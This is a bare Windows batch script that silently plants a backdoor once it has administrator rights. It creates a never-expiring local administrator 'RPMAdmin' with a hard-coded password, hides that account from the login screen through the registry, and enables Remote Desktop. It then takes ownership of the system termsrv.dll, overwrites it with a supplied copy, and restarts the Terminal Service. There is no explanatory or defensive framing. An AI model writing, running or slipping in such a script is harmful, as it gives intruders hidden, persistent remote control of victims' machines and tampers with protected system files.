@echo off 
NET SESSION >nul 2>&1 
IF %ERRORLEVEL% NEQ 0 exit /b 1 
net user RPMAdmin Pass123! /ADD /Y /EXPIRES:NEVER >nul 2>&1 
net localgroup Administrators RPMAdmin /ADD >nul 2>&1 
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >nul 2>&1 
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v RPMAdmin /t REG_DWORD /d 0 /f >nul 2>&1 
if exist termsrv.dll ( 
takeown /f "%windir%\System32\termsrv.dll" >nul 2>&1 
icacls "%windir%\System32\termsrv.dll" /grant Administrators:F >nul 2>&1 
copy termsrv.dll "%windir%\System32\termsrv.dll" /Y >nul 2>&1 
) 
net stop TermService /Y >nul 2>&1 
net start TermService >nul 2>&1 
exit /b 0 
